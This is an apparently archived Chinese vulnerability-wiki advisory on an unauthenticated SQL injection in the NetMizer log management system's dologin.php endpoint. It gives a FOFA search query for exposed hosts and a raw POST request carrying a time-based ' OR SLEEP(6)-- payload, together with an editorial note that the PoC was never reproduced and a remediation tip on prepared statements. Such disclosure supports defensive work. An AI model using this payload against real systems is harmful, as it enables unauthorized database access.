---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-52242888a39e61b4ab902233"
entity_id: "ve-52242888a39e61b4ab902233"
schema_version: "1"
cnvd_unverified: "XVE-2024-37672"
xve: "XVE-2024-37672"
title: "NetMizer dologin.php sql注入漏洞(XVE-2024-37672)"
product: "NetMizer日志管理系统"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "XVE-2024-37672"
referenced_identifiers: ""
prerequisites: "称前台无认证，未列版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/NetMizer/NetMizer%20dologin.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28XVE-2024-37672%29.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# NetMizer dologin.php sql注入漏洞(XVE-2024-37672)

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：NetMizer日志管理系统
- 本文讨论：XVE-2024-37672 / data/login/dologin.php SQL注入
- 版本、权限与配置前提：称前台无认证，未列版本
- 资料类型：SQL注入PoC摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- XVE编号误置cnvd字段
- 只有SLEEP请求与截图，无延迟基线；在野利用及进一步RCE/写文件泛化缺本文证据
- 缺精确原始公告、补丁和固定版本
- 已落实的文本修订：编号保留原值并纠正命名空间字段。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 版本、认证状态、时间对照和厂商确认待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

NetMizer 在/dologin.php接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

NetMizer

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="NetMizer-日志管理系统"

POC/EXP：

POST /data/login/dologin.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 57

action=login&username='%20OR%20SLEEP(6)--%20qAZp&passwd=1

![image-20250304151633278](./.resource/NetMizerdologin.phpsql注入漏洞XVE-2024-37672/media/image-20250304151633278.png)


![image-20250304151704570](./.resource/NetMizerdologin.phpsql注入漏洞XVE-2024-37672/media/image-20250304151704570.png)




# 漏洞修复

参数使用预编译形式用以对sql注入防护，同时限制接口参数输入。

下载官方补丁进行修复


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
